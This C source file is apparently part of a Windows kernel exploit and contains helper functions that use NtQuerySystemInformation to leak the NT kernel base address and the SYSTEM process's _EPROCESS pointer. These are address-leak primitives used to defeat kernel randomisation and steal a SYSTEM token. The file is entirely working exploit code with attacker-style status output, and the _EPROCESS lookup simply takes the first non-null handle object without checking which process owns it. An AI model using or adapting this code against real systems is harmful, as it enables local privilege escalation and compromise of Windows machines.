#include "exploit.h"
#include "leak_utilities.h"

unsigned long long leak_ntoskrnl_base_address(HMODULE nt_dll_handle)
{
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	PSYSTEM_MODULE_INFORMATION module_info = (void*)0;
	unsigned long return_length = 0UL;
	long status = 0L;
	unsigned char unused = 0;

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(nt_dll_handle, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" exported function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Located the \"NtQuerySystemInformation\" exported function. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemModuleInformation, 0, 0, &return_length);
	module_info = (PSYSTEM_MODULE_INFORMATION)malloc(return_length);
	status = _NtQuerySystemInformation(SystemModuleInformation, module_info, return_length, &return_length);
	if (status)
	{
		printf("\n[-] Failed to query system module information. NTSTATUS: %d (0x%x)", status, status);
		unused = getchar();
		return 0;
	}
	printf("\n[+] Queried system module information. NTSTATUS: %d (0x%x)", status, status);

	if (module_info)
	{
		printf("\n[+] Leaked the NT kernel base address. Kernel Base Address: 0x%p", module_info->Modules[0].ImageBaseAddress);
		return (unsigned long long)module_info->Modules[0].ImageBaseAddress;
	}
	printf("\n[-] Failed to leak the NT kernel base address.");

	unused = getchar();
	return 0;
}

unsigned long long leak_system_eprocess_pointer(HMODULE nt_dll_handle)
{
	NtQuerySystemInformation _NtQuerySystemInformation = 0;
	PSYSTEM_HANDLE_INFORMATION_EX handle_entries = (void*)0;
	unsigned long handle_entries_length = 0UL;
	long status = 0L;
	unsigned char unused = 0;

	_NtQuerySystemInformation = (NtQuerySystemInformation)GetProcAddress(nt_dll_handle, "NtQuerySystemInformation");
	if (!_NtQuerySystemInformation)
	{
		printf("\n[-] Failed to locate the \"NtQuerySystemInformation\" exported function. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 0;
	}
	printf("\n[+] Located the \"NtQuerySystemInformation\" exported function. Function Address: 0x%p", _NtQuerySystemInformation);

	_NtQuerySystemInformation(SystemExtendedHandleInformation, 0, 0, &handle_entries_length);
	handle_entries = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(handle_entries_length);
	status = _NtQuerySystemInformation(SystemExtendedHandleInformation, handle_entries, handle_entries_length, 0);
	while (status == 0xC0000004)
	{
		if (handle_entries)
		{
			free(handle_entries);
		}
		handle_entries_length *= 2;
		handle_entries = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(handle_entries_length);
		if (handle_entries)
		{
			status = _NtQuerySystemInformation(SystemExtendedHandleInformation, handle_entries, handle_entries_length, 0);
		}
	}
	printf("\n[+] Queried system information. NTSTATUS: %d (0x%x)", status, status);

	if (handle_entries)
	{
		for (unsigned long i = 0; i < handle_entries->NumberOfHandles; i++)
		{
			if (handle_entries->Handles[i].Object)
			{
				printf("\n[+] Leaked the \"SYSTEM\" process' \"_EPROCESS\" structure pointer. Pointer: 0x%p", handle_entries->Handles[i].Object);
				return (unsigned long long)handle_entries->Handles[i].Object;
			}
		}
	}
	printf("\n[-] Failed to leak the \"SYSTEM\" process' \"_EPROCESS\" structure pointer.");

	unused = getchar();
	return 0;
}